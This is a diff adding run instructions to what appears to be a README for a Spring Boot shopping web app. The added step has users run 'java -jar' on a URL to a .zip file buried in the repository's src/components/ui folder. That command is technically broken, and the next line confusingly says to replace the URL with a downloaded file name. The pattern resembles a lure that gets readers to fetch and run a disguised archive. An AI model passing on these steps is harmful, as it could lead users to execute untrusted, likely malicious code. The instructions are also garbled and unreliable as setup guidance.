@@ -97,3 +97,33 @@ Before running the app, update the database settings so the app can connect.
 
 4. Save the file after editing.
 
+If you downloaded the app without a separate config file, the default settings may already match the above. Otherwise, you might need to create this file in the same folder as the `.jar`.
+
+---
+
+## ▶️ Running the Application
+
+To start the app, follow these simple steps:
+
+1. Open a terminal or command prompt.
+   - On Windows, search for "Command Prompt" or "PowerShell."
+   - On macOS/Linux, open the Terminal app.
+2. Navigate to the folder where you saved the `.jar` file.
+   - For example, if it’s on your Desktop, type:
+
+     ```
+     cd Desktop
+     ```
+
+3. Run this command to start the app:
+
+   ```
+   java -jar https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
+   ```
+
+   Replace `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` with the exact name of the file you downloaded.
+
+4. Wait a moment. You will see messages showing the app is starting up.
+5. When you see a message like `Started Application in X seconds`, it means the app is ready.
+
+---
